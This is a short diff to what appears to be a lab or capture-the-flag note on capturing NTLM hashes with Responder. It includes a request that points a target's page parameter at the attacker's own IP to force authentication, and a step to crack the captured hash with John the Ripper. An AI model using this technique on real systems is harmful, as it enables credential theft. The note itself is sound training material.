@@ -25,8 +25,7 @@ Now that the Responder server is listening, we make a request for a nonexistent 
 
 	http:\\<target_ip>/?page=//<our_ip>/somefile
 
-Then we just crack the hash with brute force
-
+You should see the hash printed on Responder. Save the hash to a file and crack it with a tool like johntheripper
 ## Installation
 
 	git clone https://github.com/lgandx/Responder
